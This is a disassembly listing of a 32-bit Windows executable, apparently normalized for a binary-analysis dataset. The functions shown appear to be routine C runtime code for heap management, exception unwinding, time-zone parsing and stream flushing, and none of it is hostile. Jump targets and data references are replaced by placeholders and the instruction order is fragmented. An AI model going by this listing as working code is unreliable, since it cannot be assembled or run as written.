call [ HeapCreate@IAT ]
test eax eax
mov [ rw-data ] eax
je r-xdata
xor eax eax
retn
call sub_40954d
test eax eax
jne r-xdata
push 0x1
pop eax
retn
push [ rw-data ]
call [ HeapDestroy@IAT ]
sub_408514
push ebp
mov ebp esp
push ebx
push esi
push edi
push ebp
push 0x0
push 0x0
push r-xdata
push [ ebp + 0x8 ]
call RtlUnwind
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_408556
push ebx
push esi
push edi
mov eax [ esp + 0x10 ]
push eax
push 0xfffffffe
push sub_408534
push [ fs : 0x0 ]
mov [ fs : 0x0 ] esp
pop [ fs : 0x0 ]
add esp 0xc
pop edi
pop esi
pop ebx
retn
cmp esi [ esp + 0x24 ]
je r-xdata
lea esi [ esi + esi * 2 ]
mov ecx [ ebx + esi * 4 ]
mov [ esp + 0x8 ] ecx
mov [ eax + 0xc ] ecx
cmp [ ebx + esi * 4 + 0x4 ] 0x0
jne r-xdata
jmp r-xdata
push 0x101
mov eax [ ebx + esi * 4 + 0x8 ]
call sub_4085ea
call [ ebx + esi * 4 + 0x8 ]
mov eax [ esp + 0x20 ]
mov ebx [ eax + 0x8 ]
mov esi [ eax + 0xc ]
cmp esi 0xffffffff
je r-xdata
sub_408604
push esi
inc ebx
xor dh [ eax ]
pop eax
inc ebx
xor [ eax ] dh
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push ebp
cld
mov ebx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
test [ eax + 0x4 ] 0x6
jne r-xdata
push ebp
lea ebp [ ebx + 0x10 ]
push 0xffffffff
push ebx
call sub_408556
add esp 0x8
pop ebp
mov eax 0x1
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x8 ]
mov [ ebx - 0x4 ] eax
mov esi [ ebx + 0xc ]
mov edi [ ebx + 0x8 ]
mov eax 0x1
jmp r-xdata
lea ecx [ esi + esi * 2 ]
cmp [ edi + ecx * 4 + 0x4 ] 0x0
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebx + 0x8 ]
lea ecx [ esi + esi * 2 ]
mov esi [ edi + ecx * 4 ]
jmp r-xdata
push esi
push ebp
lea ebp [ ebx + 0x10 ]
call [ edi + ecx * 4 + 0x4 ]
pop ebp
pop esi
mov ebx [ ebp + 0xc ]
or eax eax
je r-xdata
cmp esi 0xffffffff
je r-xdata
js r-xdata
mov eax 0x0
jmp r-xdata
mov edi [ ebx + 0x8 ]
push ebx
call sub_408514
add esp 0x4
lea ebp [ ebx + 0x10 ]
push esi
push ebx
call sub_408556
add esp 0x8
lea ecx [ esi + esi * 2 ]
push 0x1
mov eax [ edi + ecx * 4 + 0x8 ]
call sub_4085ea
mov eax [ edi + ecx * 4 ]
mov [ ebx + 0xc ] eax
call [ edi + ecx * 4 + 0x8 ]
sub_4086e4
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
push 0xfc
call sub_40871d
mov eax [ rw-data ]
pop ecx
test eax eax
je r-xdata
test eax eax
jne r-xdata
push 0xff
call sub_40871d
pop ecx
call eax
retn
cmp [ rw-data ] 0x1
jne r-xdata
sub_40871d
push ebp
mov ebp esp
sub esp 0x1a4
mov edx [ ebp + 0x8 ]
xor ecx ecx
mov eax rw-data
push esi
mov esi ecx
shl esi 0x3
cmp edx [ esi + rw-data ]
jne r-xdata
add eax 0x8
inc ecx
cmp eax rw-data
jl r-xdata
pop esi
leave
retn
mov eax [ rw-data ]
cmp eax 0x1
je r-xdata
cmp edx [ eax ]
je r-xdata
lea eax [ ebp + 0x8 ]
lea esi [ esi + rw-data ]
push 0x0
push eax
push [ esi ]
call sub_405b40
pop ecx
push eax
push [ esi ]
push 0xfffffff4
call [ GetStdHandle@IAT ]
push eax
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
cmp edx 0xfc
je r-xdata
cmp [ rw-data ] 0x1
je r-xdata
lea eax [ ebp - 0x1a4 ]
push 0x104
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
test eax eax
jne r-xdata
lea eax [ ebp - 0x1a4 ]
push edi
push eax
lea edi [ ebp - 0x1a4 ]
call sub_405b40
inc eax
pop ecx
cmp eax 0x3c
jbe r-xdata
lea eax [ ebp - 0x1a4 ]
push r--data
push eax
call sub_405950
pop ecx
pop ecx
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_405950
lea eax [ ebp - 0xa0 ]
push edi
push eax
call sub_405960
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_405960
push [ esi + rw-data ]
lea eax [ ebp - 0xa0 ]
push eax
call sub_405960
push 0x12010
lea eax [ ebp - 0xa0 ]
push r--data
push eax
call sub_40a79f
add esp 0x2c
pop edi
jmp r-xdata
lea eax [ ebp - 0x1a4 ]
push eax
call sub_405b40
mov edi eax
lea eax [ ebp - 0x1a4 ]
sub eax 0x3b
push 0x3
add edi eax
push r--data
push edi
call sub_405a40
add esp 0x10
sub_408870
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_405d70
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_405cd0
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_4089b9
push ebx
push esi
mov esi [ esp + 0xc ]
push edi
imul esi [ esp + 0x14 ]
cmp esi 0xffffffe0
mov ebx esi
ja r-xdata
xor edi edi
cmp esi 0xffffffe0
ja r-xdata
test esi esi
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
cmp ebx [ rw-data ]
ja r-xdata
add esi 0xf
and esi 0xfffffff0
push 0x1
pop esi
mov eax edi
push esi
call sub_40a08c
test eax eax
pop ecx
je r-xdata
push esi
push 0x8
push [ rw-data ]
call [ HeapAlloc@IAT ]
mov edi eax
test edi edi
jne r-xdata
push 0x9
call sub_408a6f
push ebx
call sub_4098e1
push 0x9
mov edi eax
call sub_408ad0
add esp 0xc
test edi edi
jne r-xdata
xor eax eax
jmp r-xdata
jmp r-xdata
push ebx
push 0x0
push edi
call sub_405cd0
add esp 0xc
pop edi
pop esi
pop ebx
retn
sub_408a6f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
cmp [ eax * 4 + rw-data ] 0x0
lea esi [ eax * 4 + rw-data ]
jne r-xdata
push [ esi ]
call [ EnterCriticalSection@IAT ]
pop esi
pop ebp
retn
push edi
push 0x18
call sub_4070b4
mov edi eax
pop ecx
test edi edi
jne r-xdata
push 0x11
call sub_408a6f
cmp [ esi ] 0x0
pop ecx
push edi
jne r-xdata
push 0x11
call sub_4062ea
pop ecx
call sub_40706c
pop ecx
call [ InitializeCriticalSection@IAT ]
mov [ esi ] edi
jmp r-xdata
push 0x11
call sub_408ad0
pop ecx
pop edi
sub_408ae5
cmp [ rw-data ] 0x0
jne r-xdata
retn
push 0xb
call sub_408a6f
cmp [ rw-data ] 0x0
pop ecx
jne r-xdata
push 0xb
call sub_408ad0
pop ecx
call sub_408b13
inc [ rw-data ]
sub_408b13
push ebp
mov ebp esp
push ecx
push ecx
push ebx
push esi
push edi
push 0xc
pop edi
xor ebx ebx
push edi
mov [ ebp - 0x8 ] ebx
call sub_408a6f
or [ rw-data ] 0xffffffff
or [ rw-data ] 0xffffffff
mov [ rw-data ] ebx
mov [ esp ] r--data
call sub_40a8b4
mov esi eax
pop ecx
cmp esi ebx
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push edi
call sub_408ad0
mov [ esp ] rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax 0xffffffff
je r-xdata
push edi
call sub_408ad0
pop ecx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bx
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_40706c
push esi
call sub_405b40
inc eax
push eax
call sub_4070b4
add esp 0xc
cmp eax ebx
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_40a830
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bx
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_405950
push edi
call sub_408ad0
push 0x3
push esi
push [ rw-data ]
call sub_405a40
mov eax [ rw-data ]
add esi 0x3
add esp 0x18
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebx
mov [ rw-data ] ebx
mov eax [ rw-data ]
cmp eax ebx
je r-xdata
push esi
call sub_4058b7
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
mov [ ebp - 0x8 ] 0x1
inc esi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ ebp - 0x4 ] ebx
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
jmp r-xdata
cmp [ ebp - 0x4 ] ebx
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebx
push 0x3f
mov edi 0x220
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ ebp - 0x4 ]
push eax
push ebx
push 0x3f
push [ rw-data ]
push 0xffffffff
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
inc esi
push esi
call sub_4058b7
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
test eax eax
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_405a40
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_4058b7
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_408dbb
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_408f67
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_408f67
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_408f67
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_408f67
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_408f67
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_4090a7
push ebx
push edi
push 0x2
xor ebx ebx
call sub_408a6f
pop ecx
push 0x3
pop edi
cmp [ rw-data ] edi
jle r-xdata
push 0x2
call sub_408ad0
pop ecx
mov eax ebx
pop edi
pop ebx
retn
push esi
inc edi
cmp edi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
mov eax [ rw-data ]
mov esi edi
shl esi 0x2
mov eax [ esi + eax ]
test eax eax
je r-xdata
pop esi
cmp edi 0x14
jl r-xdata
push eax
call sub_40a931
cmp eax 0xffffffff
pop ecx
je r-xdata
mov eax [ rw-data ]
mov eax [ esi + eax ]
add eax 0x20
push eax
call [ DeleteCriticalSection@IAT ]
mov eax [ rw-data ]
push [ esi + eax ]
call sub_40706c
mov eax [ rw-data ]
pop ecx
and [ esi + eax ] 0x0
inc ebx
sub_409128
push esi
mov esi [ esp + 0x8 ]
push esi
call sub_409156
test eax eax
pop ecx
je r-xdata
test [ esi + 0xd ] 0x40
je r-xdata
or eax 0xffffffff
pop esi
retn
xor eax eax
pop esi
retn
push [ esi + 0x10 ]
call sub_40a9ae
neg eax
pop ecx
pop esi
sbb eax eax
retn
sub_409156
push ebx
push esi
mov esi [ esp + 0xc ]
xor ebx ebx
push edi
mov eax [ esi + 0xc ]
mov ecx eax
and ecx 0x3
cmp cl 0x2
jne r-xdata
mov eax [ esi + 0x8 ]
and [ esi + 0x4 ] 0x0
mov [ esi ] eax
pop edi
mov eax ebx
pop esi
pop ebx
retn
test ax 0x108
je r-xdata
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
test edi edi
jle r-xdata
push edi
push eax
push [ esi + 0x10 ]
call sub_40aa41
add esp 0xc
cmp eax edi
jne r-xdata
or [ esi + 0xc ] 0x20
or ebx 0xffffffff
mov eax [ esi + 0xc ]
test al 0x80
je r-xdata
and al 0xfd
mov [ esi + 0xc ] eax
jmp r-xdata
sub_4091bb
push ebx
push esi
push edi
push 0x2
xor ebx ebx
xor edi edi
call sub_408a6f
xor esi esi
pop ecx
cmp [ rw-data ] esi
jle r-xdata
push 0x2
call sub_408ad0
cmp [ esp + 0x14 ] 0x1
pop ecx
mov eax ebx
je r-xdata
mov eax [ rw-data ]
mov eax [ eax + esi * 4 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
inc esi
cmp esi [ rw-data ]
jl r-xdata
test [ eax + 0xc ] 0x83
je r-xdata
push eax
push esi
call sub_40665f
mov eax [ rw-data ]
pop ecx
pop ecx
mov eax [ eax + esi * 4 ]
mov ecx [ eax + 0xc ]
test cl 0x83
je r-xdata
mov eax [ rw-data ]
push [ eax + esi * 4 ]
push esi
call sub_4066b1
pop ecx
pop ecx
cmp [ esp + 0x10 ] 0x1
jne r-xdata
cmp [ esp + 0x10 ] 0x0
jne r-xdata
push eax
call sub_409128
cmp eax 0xffffffff
pop ecx
je r-xdata
test cl 0x2
je r-xdata
inc ebx
jmp r-xdata
push eax
call sub_409128
cmp eax 0xffffffff
pop ecx
jne r-xdata
or edi eax
sub_40925f
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jb r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
lea eax [ eax + eax * 8 ]
mov ecx [ ecx * 4 + rw-data ]
mov al [ ecx + eax * 4 + 0x4 ]
and eax 0x40
retn
xor eax eax
retn
sub_409288
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push edi
push esi
call [ InterlockedIncrement@IAT ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
cmp [ rw-data ] ebx
je r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_4092e1
pop ecx
mov [ ebp + 0xc ] eax
test ebx ebx
pop ecx
je r-xdata
push esi
call edi
push 0x13
call sub_408a6f
pop ecx
push 0x1
pop ebx
push esi
call edi
push 0x13
call sub_408ad0
pop ecx
jmp r-xdata
mov eax [ ebp + 0xc ]
pop edi
pop esi
pop ebx
pop ebp
retn
sub_4092e1
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
call sub_40acad
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_409350
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_4093c0
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_409435
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi + 0xc ]
mov ebx [ esi + 0x10 ]
test al 0x82
je r-xdata
or al 0x20
mov [ esi + 0xc ] eax
test al 0x40
jne r-xdata
test al 0x1
je r-xdata
mov eax [ esi + 0xc ]
and [ esi + 0x4 ] 0x0
and [ ebp + 0xc ] 0x0
and al 0xef
or al 0x2
test ax 0x10c
mov [ esi + 0xc ] eax
jne r-xdata
and [ esi + 0x4 ] 0x0
test al 0x10
je r-xdata
test [ esi + 0xc ] 0x108
push edi
je r-xdata
cmp esi rw-data
je r-xdata
mov ecx [ esi + 0x8 ]
and al 0xfe
mov [ esi ] ecx
mov [ esi + 0xc ] eax
push 0x1
lea eax [ ebp + 0x8 ]
pop edi
push edi
push eax
push ebx
call sub_40aa41
add esp 0xc
mov [ ebp + 0xc ] eax
mov eax [ esi + 0x8 ]
mov edi [ esi ]
sub edi eax
lea ecx [ eax + 0x1 ]
mov [ esi ] ecx
mov ecx [ esi + 0x18 ]
dec ecx
test edi edi
mov [ esi + 0x4 ] ecx
jle r-xdata
push ebx
call sub_40925f
test eax eax
pop ecx
jne r-xdata
cmp esi rw-data
jne r-xdata
mov eax [ ebp + 0x8 ]
and eax 0xff
jmp r-xdata
or [ esi + 0xc ] 0x20
jmp r-xdata
cmp ebx 0xffffffff
je r-xdata
push edi
push eax
push ebx
call sub_40aa41
add esp 0xc
mov [ ebp + 0xc ] eax
jmp r-xdata
push esi
call sub_40ad97
pop ecx
pop esi
pop ebx
pop ebp
retn
or eax 0xffffffff
mov eax rw-data
mov ecx ebx
mov eax ebx
sar ecx 0x5
and eax 0x1f
mov ecx [ ecx * 4 + rw-data ]
lea eax [ eax + eax * 8 ]
lea eax [ ecx + eax * 4 ]
jmp r-xdata
mov eax [ esi + 0x8 ]
mov cl [ ebp + 0x8 ]
mov [ eax ] cl
jmp r-xdata
push 0x2
push 0x0
push ebx
call sub_40acbf
add esp 0xc
test [ eax + 0x4 ] 0x20
je r-xdata
cmp [ ebp + 0xc ] edi
pop edi
je r-xdata
sub_40954d
push 0x140
push 0x0
push [ rw-data ]
call [ HeapAlloc@IAT ]
test eax eax
mov [ rw-data ] eax
jne r-xdata
and [ rw-data ] 0x0
and [ rw-data ] 0x0
push 0x1
mov [ rw-data ] eax
mov [ rw-data ] 0x10
pop eax
retn
retn
sub_40958b
mov eax [ rw-data ]
lea ecx [ eax + eax * 4 ]
mov eax [ rw-data ]
lea ecx [ eax + ecx * 4 ]
xor eax eax
mov edx [ esp + 0x4 ]
sub edx [ eax + 0xc ]
cmp edx 0x100000
jb r-xdata
retn
add eax 0x14
jmp r-xdata
cmp eax ecx
jae r-xdata
sub_4095b6
push ebp
mov ebp esp
sub esp 0x14
mov edx [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
push ebx
push esi
mov eax [ ecx + 0x10 ]
mov esi edx
sub esi [ ecx + 0xc ]
mov ebx [ edx - 0x4 ]
add edx 0xfffffffc
push edi
shr esi 0xf
mov ecx esi
mov edi [ edx - 0x4 ]
imul ecx ecx 0x204
dec ebx
mov [ ebp - 0x4 ] edi
lea ecx [ ecx + eax + 0x144 ]
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ecx
mov ecx [ ebx + edx ]
test cl 0x1
mov [ ebp - 0x8 ] ecx
jne r-xdata
mov edi ebx
sar edi 0x4
dec edi
cmp edi 0x3f
jbe r-xdata
sar ecx 0x4
push 0x3f
dec ecx
pop edi
mov [ ebp + 0xc ] ecx
cmp ecx edi
jbe r-xdata
mov ecx [ ebp - 0x4 ]
and ecx 0x1
mov [ ebp - 0x14 ] ecx
jne r-xdata
push 0x3f
pop edi
mov ecx [ ebx + edx + 0x4 ]
cmp ecx [ ebx + edx + 0x8 ]
jne r-xdata
mov [ ebp + 0xc ] edi
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
sub edx [ ebp - 0x4 ]
mov ecx [ ebp - 0x4 ]
sar ecx 0x4
push 0x3f
mov [ ebp - 0x8 ] edx
dec ecx
pop edx
cmp ecx edx
mov [ ebp + 0xc ] ecx
jbe r-xdata
mov ecx [ ebx + edx + 0x8 ]
mov edi [ ebx + edx + 0x4 ]
mov [ ecx + 0x4 ] edi
mov ecx [ ebx + edx + 0x4 ]
mov edi [ ebx + edx + 0x8 ]
add ebx [ ebp - 0x8 ]
mov [ ecx + 0x8 ] edi
mov [ ebp - 0xc ] ebx
mov ecx [ ebp + 0xc ]
cmp ecx 0x20
jae r-xdata
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov ecx [ ecx + 0x4 ]
mov [ edx + 0x4 ] ecx
mov ecx [ ebp - 0x10 ]
lea ecx [ ecx + edi * 8 ]
mov [ edx + 0x8 ] ecx
mov [ ecx + 0x4 ] edx
mov ecx [ edx + 0x4 ]
mov [ ecx + 0x8 ] edx
mov ecx [ edx + 0x4 ]
cmp ecx [ edx + 0x8 ]
jne r-xdata
cmp [ ebp + 0xc ] edi
je r-xdata
add ebx [ ebp - 0x4 ]
mov edi ebx
mov [ ebp - 0xc ] ebx
sar edi 0x4
dec edi
cmp edi edx
jbe r-xdata
mov [ ebp + 0xc ] edx
mov ecx edx
add ecx 0xffffffe0
mov edi 0x80000000
shr edi cl
mov ecx [ ebp + 0xc ]
lea ecx [ ecx + eax + 0x4 ]
not edi
